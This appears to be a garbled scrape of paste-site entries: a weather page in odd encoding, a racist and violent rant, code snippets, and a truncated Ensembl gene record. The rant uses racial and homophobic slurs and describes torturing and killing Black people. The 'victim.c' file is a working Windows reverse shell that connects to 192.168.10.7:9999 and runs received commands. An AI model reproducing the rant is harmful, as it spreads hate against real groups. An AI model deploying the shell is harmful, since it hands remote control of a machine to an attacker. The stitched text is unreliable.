S‎a‎t‎ ‎1‎9‎ ‎|‎ ‎N‎i‎g‎h‎t‎
7‎6‎°‎
7‎%‎
S‎
9‎
 ‎
m‎p‎h‎
C‎l‎e‎a‎r‎ ‎s‎k‎i‎e‎s‎.‎ ‎L‎o‎w‎ ‎7‎6‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
6‎3‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
9‎:‎4‎5‎ ‎a‎m‎
W‎a‎x‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎o‎n‎s‎e‎t‎
1‎0‎:‎0‎3‎ ‎p‎m‎
S‎u‎n‎ ‎2‎0‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
1‎0‎6‎°‎
/‎7‎7‎°‎
7‎%‎
S‎S‎E‎ ‎9‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎1‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
1‎0‎6‎°‎
/‎7‎7‎°‎
3‎%‎
S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎2‎
P‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
9‎7‎°‎
/‎7‎5‎°‎
3‎9‎%‎
E‎ ‎1‎6‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎3‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
1‎0‎2‎°‎
/‎7‎5‎°‎
8‎%‎
E‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎4‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
1‎0‎5‎°‎
/‎7‎6‎°‎
6‎%‎
N‎E‎ ‎9‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎5‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
1‎0‎6‎°‎
/‎7‎8‎°‎
5‎%‎
S‎E‎ ‎8‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
1‎0‎6‎°‎
/‎7‎8‎°‎
2‎%‎
N‎W‎ ‎8‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
1‎0‎5‎°‎
/‎7‎8‎°‎
1‎8‎%‎
N‎ ‎1‎0‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎8‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
1‎0‎4‎°‎
/‎7‎5‎°‎
2‎2‎%‎
N‎E‎ ‎9‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
1‎0‎4‎°‎
/‎7‎4‎°‎
2‎%‎
E‎ ‎9‎ ‎m‎p‎h‎
W‎e‎d‎ ‎3‎0‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
1‎0‎3‎°‎
/‎7‎5‎°‎
2‎1‎%‎
E‎N‎E‎ ‎8‎ ‎m‎p‎h‎
T‎h‎u‎ ‎3‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
1‎0‎2‎°‎
/‎7‎5‎°‎
2‎4‎%‎
S‎S‎E‎ ‎9‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
1‎0‎3‎°‎
/‎7‎6‎°‎
1‎3‎%‎
S‎ ‎9‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
1‎0‎2‎°‎
/‎7‎5‎°‎
2‎3‎%‎
S‎ ‎1‎0‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎H‎u‎r‎r‎i‎c‎a‎n‎e‎ ‎H‎i‎l‎a‎r‎y‎.‎ ‎👱🏼‍♀️

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

S‎a‎t‎a‎n‎i‎s‎t‎
F‎o‎r‎ ‎a‎s‎ ‎l‎o‎n‎g‎ ‎a‎s‎ ‎t‎h‎e‎r‎e‎ ‎h‎a‎v‎e‎ ‎b‎e‎e‎n‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎s‎,‎ ‎t‎h‎e‎r‎e‎ ‎h‎a‎v‎e‎ ‎b‎e‎e‎n‎ ‎t‎h‎o‎s‎e‎ ‎w‎h‎o‎ ‎k‎i‎n‎d‎a‎ ‎w‎e‎n‎t‎ ‎t‎h‎e‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎l‎y‎ ‎o‎p‎p‎o‎s‎i‎t‎e‎ ‎d‎i‎r‎e‎c‎t‎i‎o‎n‎,‎ ‎a‎n‎d‎ ‎w‎o‎r‎s‎h‎i‎p‎e‎d‎ ‎S‎a‎t‎a‎n‎,‎ ‎a‎s‎ ‎o‎p‎p‎o‎s‎e‎d‎ ‎t‎o‎ ‎G‎o‎d‎ ‎-‎ ‎s‎o‎m‎e‎o‎n‎e‎ ‎a‎l‎w‎a‎y‎s‎ ‎h‎a‎s‎ ‎t‎o‎ ‎r‎o‎o‎t‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎l‎o‎s‎i‎n‎g‎ ‎t‎e‎a‎m‎.‎ ‎T‎h‎e‎s‎e‎ ‎r‎e‎b‎e‎l‎s‎ ‎h‎a‎v‎e‎ ‎c‎o‎m‎e‎ ‎t‎o‎ ‎b‎e‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎S‎a‎t‎a‎n‎i‎s‎t‎s‎.‎ ‎J‎u‎s‎t‎ ‎l‎i‎k‎e‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎s‎,‎ ‎t‎h‎e‎y‎'‎r‎e‎ ‎o‎v‎e‎r‎l‎y‎ ‎d‎e‎f‎e‎n‎s‎i‎v‎e‎ ‎a‎b‎o‎u‎t‎ ‎t‎h‎e‎i‎r‎ ‎b‎e‎l‎i‎e‎f‎s‎,‎ ‎a‎n‎d‎ ‎w‎i‎l‎l‎ ‎b‎i‎t‎c‎h‎ ‎a‎b‎o‎u‎t‎ ‎y‎o‎u‎ ‎o‎n‎ ‎t‎h‎e‎i‎r‎ ‎L‎i‎v‎e‎J‎o‎u‎r‎n‎a‎l‎s‎,‎ ‎s‎h‎o‎u‎l‎d‎ ‎y‎o‎u‎ ‎e‎v‎e‎r‎ ‎c‎r‎o‎s‎s‎ ‎t‎h‎e‎m‎.‎ ‎N‎o‎t‎e‎:‎ ‎t‎h‎e‎ ‎v‎a‎s‎t‎ ‎m‎a‎j‎o‎r‎i‎t‎y‎ ‎o‎f‎ ‎S‎a‎t‎a‎n‎i‎s‎t‎s‎ ‎d‎o‎n‎'‎t‎ ‎e‎v‎e‎n‎ ‎w‎o‎r‎s‎h‎i‎p‎ ‎t‎h‎e‎ ‎d‎e‎v‎i‎l‎;‎ ‎t‎h‎e‎y‎'‎r‎e‎ ‎b‎a‎s‎i‎c‎a‎l‎l‎y‎ ‎j‎u‎s‎t‎ ‎e‎g‎o‎t‎i‎s‎t‎i‎c‎a‎l‎ ‎a‎t‎h‎e‎i‎s‎t‎s‎ ‎t‎h‎a‎t‎ ‎s‎e‎t‎ ‎o‎u‎t‎ ‎t‎o‎ ‎w‎o‎r‎s‎h‎i‎p‎ ‎t‎h‎e‎m‎s‎e‎l‎v‎e‎s‎ ‎a‎s‎ ‎""‎g‎o‎d‎s‎""‎.‎ ‎E‎v‎e‎n‎ ‎t‎h‎e‎ ‎g‎u‎y‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎h‎a‎i‎r‎i‎e‎s‎t‎ ‎s‎l‎a‎b‎ ‎o‎f‎ ‎f‎a‎t‎ ‎b‎e‎l‎o‎w‎ ‎h‎i‎s‎ ‎c‎h‎i‎n‎ ‎d‎o‎e‎s‎n‎'‎t‎ ‎h‎a‎v‎e‎ ‎a‎s‎ ‎c‎l‎a‎s‎s‎y‎ ‎a‎ ‎f‎e‎d‎o‎r‎a‎ ‎t‎h‎a‎t‎ ‎m‎o‎s‎t‎ ‎S‎a‎t‎a‎n‎i‎s‎t‎s‎ ‎p‎o‎s‎s‎e‎s‎s‎.‎

I‎n‎ ‎a‎n‎ ‎a‎t‎t‎e‎m‎p‎t‎ ‎t‎o‎ ‎p‎r‎o‎v‎e‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎r‎e‎a‎l‎ ‎f‎r‎e‎e‎t‎h‎i‎n‎k‎e‎r‎s‎ ‎w‎h‎i‎l‎e‎ ‎s‎t‎i‎l‎l‎ ‎r‎e‎l‎y‎i‎n‎g‎ ‎o‎n‎ ‎t‎h‎e‎ ‎r‎i‎g‎h‎t‎e‎o‎u‎s‎ ‎j‎u‎s‎t‎i‎c‎e‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎r‎e‎l‎i‎g‎i‎o‎n‎,‎ ‎p‎e‎o‎p‎l‎e‎ ‎h‎a‎v‎e‎ ‎d‎i‎s‎m‎i‎s‎s‎e‎d‎ ‎S‎a‎t‎a‎n‎'‎s‎ ‎s‎t‎o‎r‎y‎ ‎a‎s‎ ‎b‎e‎i‎n‎g‎ ‎a‎ ‎d‎a‎m‎n‎e‎d‎ ‎l‎i‎e‎ ‎a‎n‎d‎ ‎r‎e‎p‎l‎a‎c‎e‎d‎ ‎i‎t‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎i‎r‎ ‎o‎w‎n‎,‎ ‎s‎t‎a‎t‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎S‎a‎t‎a‎n‎ ‎w‎a‎s‎,‎ ‎i‎n‎ ‎f‎a‎c‎t‎,‎ ‎a‎ ‎g‎r‎e‎a‎t‎ ‎m‎i‎n‎d‎ ‎w‎h‎o‎ ‎w‎a‎s‎ ‎c‎a‎s‎t‎ ‎o‎u‎t‎ ‎o‎f‎ ‎h‎e‎a‎v‎e‎n‎ ‎f‎o‎r‎ ‎d‎a‎r‎i‎n‎g‎ ‎t‎o‎ ‎q‎u‎e‎s‎t‎i‎o‎n‎ ‎G‎o‎d‎,‎ ‎t‎h‎u‎s‎ ‎m‎a‎k‎i‎n‎g‎ ‎h‎i‎m‎ ‎a‎ ‎m‎a‎r‎t‎y‎r‎ ‎a‎m‎o‎n‎g‎ ‎t‎h‎e‎ ‎s‎h‎e‎e‎p‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎t‎h‎e‎ ‎L‎o‎r‎d‎'‎s‎ ‎a‎n‎g‎e‎l‎s‎.‎


(‎(‎ ‎S‎A‎T‎A‎N‎I‎C‎ ‎P‎A‎N‎I‎C‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎e‎ ‎V‎e‎r‎m‎o‎n‎t‎ ‎S‎t‎a‎t‎e‎ ‎H‎o‎u‎s‎e‎,‎ ‎l‎o‎c‎a‎t‎e‎d‎ ‎i‎n‎ ‎M‎o‎n‎t‎p‎e‎l‎i‎e‎r‎,‎ ‎i‎s‎ ‎t‎h‎e‎ ‎s‎t‎a‎t‎e‎ ‎c‎a‎p‎i‎t‎o‎l‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎.‎S‎.‎ ‎s‎t‎a‎t‎e‎ ‎o‎f‎ ‎V‎e‎r‎m‎o‎n‎t‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎s‎e‎a‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎V‎e‎r‎m‎o‎n‎t‎ ‎G‎e‎n‎e‎r‎a‎l‎ ‎A‎s‎s‎e‎m‎b‎l‎y‎.‎ ‎T‎h‎e‎ ‎c‎u‎r‎r‎e‎n‎t‎ ‎G‎r‎e‎e‎k‎ ‎R‎e‎v‎i‎v‎a‎l‎ ‎s‎t‎r‎u‎c‎t‎u‎r‎e‎ ‎i‎s‎ ‎t‎h‎e‎ ‎t‎h‎i‎r‎d‎ ‎b‎u‎i‎l‎d‎i‎n‎g‎ ‎o‎n‎ ‎t‎h‎e‎ ‎s‎a‎m‎e‎ ‎s‎i‎t‎e‎ ‎t‎o‎ ‎b‎e‎ ‎u‎s‎e‎d‎ ‎a‎s‎ ‎t‎h‎e‎ ‎S‎t‎a‎t‎e‎ ‎H‎o‎u‎s‎e‎.‎ ‎D‎e‎s‎i‎g‎n‎e‎d‎ ‎b‎y‎ ‎T‎h‎o‎m‎a‎s‎ ‎S‎i‎l‎l‎o‎w‎a‎y‎ ‎i‎n‎ ‎1‎8‎5‎7‎ ‎a‎n‎d‎ ‎1‎8‎5‎8‎,‎ ‎i‎t‎ ‎w‎a‎s‎ ‎o‎c‎c‎u‎p‎i‎e‎d‎ ‎i‎n‎ ‎1‎8‎5‎9‎.‎ ‎T‎h‎i‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎o‎f‎ ‎t‎h‎e‎ ‎V‎e‎r‎m‎o‎n‎t‎ ‎S‎t‎a‎t‎e‎ ‎H‎o‎u‎s‎e‎ ‎w‎a‎s‎ ‎t‎a‎k‎e‎n‎ ‎i‎n‎ ‎O‎c‎t‎o‎b‎e‎r‎ ‎2‎0‎2‎1‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎T‎o‎n‎y‎ ‎J‎i‎n‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

B‎y‎e‎,‎ ‎g‎u‎y‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎c‎h‎o‎p‎ ‎u‎p‎ ‎s‎o‎m‎e‎ ‎n‎i‎g‎g‎e‎r‎s‎ ‎a‎n‎d‎ ‎m‎a‎k‎e‎ ‎t‎h‎e‎m‎ ‎i‎n‎t‎o‎ ‎n‎i‎g‎g‎e‎r‎ ‎p‎a‎n‎c‎a‎k‎e‎s‎.‎ ‎A‎n‎d‎ ‎t‎h‎e‎n‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎f‎e‎e‎d‎ ‎t‎h‎e‎ ‎n‎i‎g‎g‎e‎r‎ ‎p‎a‎n‎c‎a‎k‎e‎s‎ ‎t‎o‎ ‎y‎o‎u‎r‎ ‎m‎o‎m‎,‎ ‎t‎h‎e‎n‎ ‎o‎n‎c‎e‎ ‎I‎ ‎f‎e‎e‎d‎ ‎t‎h‎e‎m‎ ‎t‎o‎ ‎y‎o‎u‎r‎ ‎m‎o‎m‎,‎ ‎y‎o‎u‎r‎ ‎m‎o‎m‎ ‎w‎i‎l‎l‎ ‎s‎h‎i‎t‎ ‎t‎h‎e‎m‎ ‎o‎u‎t‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎I‎ ‎w‎i‎l‎l‎ ‎m‎a‎k‎e‎ ‎y‎o‎u‎r‎ ‎m‎o‎m‎ ‎e‎a‎t‎ ‎t‎h‎e‎ ‎s‎h‎i‎t‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎s‎h‎e‎ ‎w‎i‎l‎l‎ ‎s‎h‎i‎t‎ ‎o‎u‎t‎ ‎t‎h‎e‎ ‎s‎h‎i‎t‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎I‎ ‎w‎i‎l‎l‎ ‎m‎a‎k‎e‎ ‎y‎o‎u‎ ‎e‎a‎t‎ ‎t‎h‎e‎ ‎s‎h‎i‎t‎.‎ ‎I‎n‎ ‎w‎h‎i‎c‎h‎ ‎c‎a‎s‎e‎,‎ ‎y‎o‎u‎'‎l‎l‎ ‎p‎r‎o‎b‎a‎b‎l‎y‎ ‎p‎u‎k‎e‎.‎ ‎A‎n‎d‎ ‎t‎h‎e‎n‎ ‎I‎'‎l‎l‎ ‎m‎a‎k‎e‎ ‎y‎o‎u‎ ‎e‎a‎t‎ ‎t‎h‎e‎ ‎p‎u‎k‎e‎.‎ ‎A‎n‎d‎ ‎t‎h‎e‎n‎ ‎o‎n‎c‎e‎ ‎I‎ ‎d‎o‎ ‎t‎h‎a‎t‎,‎ ‎I‎'‎l‎l‎ ‎c‎h‎o‎p‎ ‎b‎o‎t‎h‎ ‎y‎o‎u‎r‎ ‎b‎a‎l‎l‎s‎ ‎o‎f‎f‎ ‎a‎n‎d‎ ‎r‎e‎p‎l‎a‎c‎e‎ ‎t‎h‎e‎m‎ ‎w‎i‎t‎h‎ ‎t‎w‎o‎ ‎c‎h‎e‎r‎r‎y‎ ‎b‎o‎m‎b‎s‎.‎ ‎T‎h‎e‎n‎ ‎I‎ ‎w‎i‎l‎l‎ ‎i‎g‎n‎i‎t‎e‎ ‎b‎o‎t‎h‎ ‎t‎h‎e‎ ‎c‎h‎e‎r‎r‎y‎ ‎b‎o‎m‎b‎s‎.‎ ‎A‎t‎ ‎t‎h‎i‎s‎ ‎p‎o‎i‎n‎t‎,‎ ‎y‎o‎u‎r‎ ‎o‎r‎g‎a‎n‎s‎ ‎w‎i‎l‎l‎ ‎p‎r‎o‎b‎a‎b‎l‎y‎ ‎h‎a‎v‎e‎ ‎b‎l‎o‎w‎n‎ ‎u‎p‎,‎ ‎w‎h‎i‎c‎h‎ ‎I‎ ‎w‎i‎l‎l‎ ‎t‎h‎e‎n‎ ‎s‎e‎l‎l‎ ‎t‎h‎e‎m‎ ‎t‎o‎ ‎s‎o‎m‎e‎ ‎n‎i‎g‎g‎e‎r‎s‎,‎ ‎a‎n‎d‎ ‎a‎f‎t‎e‎r‎ ‎t‎h‎e‎ ‎n‎i‎g‎g‎e‎r‎s‎ ‎p‎a‎y‎ ‎m‎e‎,‎ ‎I‎ ‎w‎i‎l‎l‎ ‎k‎i‎l‎l‎ ‎b‎o‎t‎h‎ ‎o‎f‎ ‎t‎h‎e‎m‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎p‎u‎t‎ ‎t‎h‎e‎i‎r‎ ‎b‎o‎n‎e‎s‎ ‎i‎n‎ ‎a‎ ‎m‎u‎s‎e‎u‎m‎ ‎w‎h‎e‎r‎e‎ ‎e‎v‎e‎r‎y‎o‎n‎e‎ ‎c‎a‎n‎ ‎l‎a‎u‎g‎h‎ ‎a‎t‎ ‎t‎h‎e‎m‎ ‎f‎o‎r‎ ‎h‎a‎v‎i‎n‎g‎ ‎m‎o‎n‎k‎e‎y‎ ‎l‎o‎o‎k‎i‎n‎g‎ ‎b‎o‎n‎e‎ ‎s‎t‎r‎u‎c‎t‎u‎r‎e‎.‎.‎.‎ ‎Y‎o‎u‎'‎r‎e‎ ‎a‎ ‎f‎a‎g‎g‎o‎t‎.‎"
QHnz87f9,C++,UDAY8755,C++,Saturday 19th of August 2023 08:48:03 AM CDT,"#include<bits/stdc++.h>
using namespace std;
#define fast ios_base::sync_with_stdio(false);cin.tie(NULL);cout.tie(NULL)
typedef long long ll;
#define pb push_back
#define f first
#define s second
#define  vll vector<ll>
#define  vvll vector<vector<ll>>"
ZwzRfFb3,👨‍💻Alpine JS Click Cheat Sheet,GeekForeverPastebin,JavaScript,Saturday 19th of August 2023 08:41:42 AM CDT,"<script src=""//unpkg.com/alpinejs"" defer></script>

x-data=""{ open: false }""

@click=""open = true""

x-show=""open""

@click.away=""open = false"""
ywHv7JGA,victim/Makefile,FlyFar,Make,Saturday 19th of August 2023 08:34:17 AM CDT,"main: victim.c
	gcc victim.c -lwsock32 -lWs2_32 -o victim.exe"
sTgYK8UX,victim/victim.c,FlyFar,C,Saturday 19th of August 2023 08:33:02 AM CDT,"#define WIN32_LEAN_AND_MEAN

#include <stdlib.h>
#include <stdio.h>

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

// constants
#define ADDRESS ""192.168.10.7""
#define PORT ""9999""
#define RECV_BUFFER_SIZE 1024
#define SEND_BUFFER_SIZE 8192

int __cdecl main(int argc, char **argv) {
	WSADATA wsa_data;
	SOCKET sock = INVALID_SOCKET;
	struct addrinfo *result = NULL, *ptr = NULL, hints;

	char buffer[RECV_BUFFER_SIZE];
	int status;

	// initialize winsock
	status = WSAStartup(MAKEWORD(2, 2), &wsa_data);

	if (status != 0) {
		printf(""WSAStartup failed with error: %d\n"", status);
		return status;
	}

	// what does the zeromemory thing do
	ZeroMemory(&hints, sizeof(hints));

	// set hints and ai family and socktype and protocol
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// resolve the server address and port
	status = getaddrinfo(ADDRESS, PORT, &hints, &result);

	if (status != 0) {
		printf(""getaddrinfo failed with error: %d\n"", status);
		WSACleanup(); // cleanup winsock i guess
		return status;
	}

	// attempt to connect to an address until it succeeds
	for (ptr = result; ptr != NULL; ptr = ptr -> ai_next) {
		// create a socket
		sock = socket(ptr -> ai_family, ptr -> ai_socktype, ptr -> ai_protocol);

		if (sock == INVALID_SOCKET) {
			printf(""socket failed with error: %ld\n"", WSAGetLastError());
			WSACleanup();
			return 1;
		}

		// connect to the server
		status = connect(sock, ptr -> ai_addr, (int)ptr -> ai_addrlen);

		if (status == SOCKET_ERROR) {
			printf(""connect failed with error: %d\n"", WSAGetLastError());
			closesocket(sock);
			sock = INVALID_SOCKET;

			continue;
		}

		break; // we did it
	}

	freeaddrinfo(result); // free the address info

	if (sock == INVALID_SOCKET) { // if we didn't do it
		printf(""Unable to connect to server!\n"");
		WSACleanup();
		return 1;
	}

	FILE *stream;
	char output[SEND_BUFFER_SIZE];
	
	// wait for commands
	do {
		// clear the buffer and output
		memset(buffer, 0, strlen(buffer));
		memset(output, 0, strlen(output));

		status = recv(sock, buffer, RECV_BUFFER_SIZE, 0);

		if (status <= 0) {
			printf(""recv failed with error: %d\n"", WSAGetLastError());
			break; // connection got closed or error
		}
		
		// execute command and get output
		stream = popen(buffer, ""r"");
		fread(output, SEND_BUFFER_SIZE, 1, stream);

		pclose(stream);

		// send output
		status = send(sock, output, (int)strlen(output), 0);

		if (status == SOCKET_ERROR) {
			printf(""send failed with error: %d\n"", WSAGetLastError());
			break; // error when sending output
		}
	} while (status > 0);

	// clean up everything
    closesocket(sock);
    WSACleanup();

	return 0;
}"
XzkwJEmJ,EnsemblAPI.get_info for lookup/id/ENSG00000110906,Fish_In_A_SUit,JSON,Saturday 19th of August 2023 08:31:17 AM CDT,"Query JSON for: https://rest.ensembl.org/lookup/id/ENSG00000110906?mane=1;expand=1
Use https://www.toptal.com/developers/json-formatter to view.

{
            ""Transcript"": [
                {
                    ""version"": 11,
                    ""display_name"": ""KCTD10-201"",
                    ""assembly_name"": ""GRCh38"",
                    ""strand"": -1,
                    ""MANE"": [
                        {
                            ""type"": ""MANE_Select"",
                            ""version"": 11,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENST00000228495"",
                            ""start"": 109448655,
                            ""db_type"": ""core"",
                            ""object_type"": ""mane"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""refseq_match"": ""NM_031954.5"",
                            ""end"": 109477300,
                            ""Parent"": ""ENSG00000110906"",
                            ""seq_region_name"": ""12""
                        }
                    ],
                    ""object_type"": ""Transcript"",
                    ""seq_region_name"": ""12"",
                    ""logic_name"": ""ensembl_havana_transcript_homo_sapiens"",
                    ""Translation"": {
                        ""db_type"": ""core"",
                        ""start"": 109451595,
                        ""id"": ""ENSP00000228495"",
                        ""end"": 109477262,
                        ""Parent"": ""ENST00000228495"",
                        ""species"": ""homo_sapiens"",
                        ""object_type"": ""Translation"",
                        ""length"": 313,
                        ""version"": 6
                    },
                    ""biotype"": ""protein_coding"",
                    ""Exon"": [
                        {
                            ""end"": 109477300,
                            ""seq_region_name"": ""12"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""db_type"": ""core"",
                            ""start"": 109477260,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003680955"",
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""start"": 109469515,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003462237"",
                            ""end"": 109469728,
                            ""seq_region_name"": ""12"",
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens""
                        },
                        {
                            ""start"": 109460636,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003651575"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109460805,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""version"": 1
                        },
                        {
                            ""version"": 1,
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109458078,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003475433"",
                            ""start"": 109457992,
                            ""db_type"": ""core""
                        },
                        {
                            ""version"": 1,
                            ""seq_region_name"": ""12"",
                            ""end"": 109457682,
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""start"": 109457630,
                            ""db_type"": ""core"",
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003462325""
                        },
                        {
                            ""version"": 1,
                            ""seq_region_name"": ""12"",
                            ""end"": 109456313,
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""db_type"": ""core"",
                            ""start"": 109456118,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00003593430""
                        },
                        {
                            ""seq_region_name"": ""12"",
                            ""end"": 109451813,
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""db_type"": ""core"",
                            ""start"": 109448655,
                            ""id"": ""ENSE00001250971"",
                            ""assembly_name"": ""GRCh38"",
                            ""version"": 8
                        }
                    ],
                    ""is_canonical"": 1,
                    ""id"": ""ENST00000228495"",
                    ""source"": ""ensembl_havana"",
                    ""db_type"": ""core"",
                    ""start"": 109448655,
                    ""species"": ""homo_sapiens"",
                    ""end"": 109477300,
                    ""Parent"": ""ENSG00000110906""
                },
                {
                    ""strand"": -1,
                    ""object_type"": ""Transcript"",
                    ""MANE"": [],
                    ""seq_region_name"": ""12"",
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""assembly_name"": ""GRCh38"",
                    ""display_name"": ""KCTD10-208"",
                    ""version"": 5,
                    ""species"": ""homo_sapiens"",
                    ""Parent"": ""ENSG00000110906"",
                    ""end"": 109458985,
                    ""source"": ""havana"",
                    ""is_canonical"": 0,
                    ""id"": ""ENST00000540089"",
                    ""start"": 109449961,
                    ""db_type"": ""core"",
                    ""Exon"": [
                        {
                            ""version"": 1,
                            ""assembly_name"": ""GRCh38"",
                            ""id"": ""ENSE00002210914"",
                            ""start"": 109457992,
                            ""db_type"": ""core"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""object_type"": ""Exon"",
                            ""seq_region_name"": ""12"",
                            ""end"": 109458985
                        },
                        {
                            ""object_type"": ""Exon"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""seq_region_name"": ""12"",
                            ""end"": 109457682,
                            ""id"": ""ENSE00003664767"",
                            ""assembly_name"": ""GRCh38"",
                            ""db_type"": ""core"",
                            ""start"": 109457630,
                            ""version"": 1
                        },
                        {
                            ""seq_region_name"": ""12"",
                            ""end"": 109456313,
                            ""object_type"": ""Exon"",
                            ""strand"": -1,
                            ""species"": ""homo_sapiens"",
                            ""start"": 109456118,
                            ""db_type"": ""core"",
                            ""id"": ""ENSE00003459435"",
                            ""assembly_name"": ""GRCh38"",
                            ""version"": 1
                        },
                        {
                            ""end"": 109451813,
                            ""seq_region_name"": ""12"",
                            ""species"": ""homo_sapiens"",
                            ""strand"": -1,
                            ""object_type"": ""Exon"",
                            ""db_type"": ""core"",
                            ""start"": 109449961,
                            ""id"": ""ENSE00002297724"",
                            ""assembly_name"": ""GRCh38"",
                            ""version"": 1
                        }
                    ],
                    ""Translation"": {
                        ""version"": 1,
                        ""length"": 132,
                        ""object_type"": ""Translation"",
                        ""species"": ""homo_sapiens"",
                        ""Parent"": ""ENST00000540089"",
                        ""end"": 109456297,
                        ""id"": ""ENSP00000439722"",
                        ""db_type"": ""core"",
                        ""start"": 109451595
                    },
                    ""biotype"": ""protein_coding""
                },
                {
                    ""version"": 5,
                    ""display_name"": ""KCTD10-216"",
                    ""assembly_name"": ""GRCh38"",
                    ""logic_name"": ""havana_homo_sapiens"",
                    ""seq_region_name"": ""12"",
                    ""strand"": -1,
                    ""MANE"": [],
                    ""object_type"": ""Transcript"",
                    ""biotype"": ""retained_intron"",
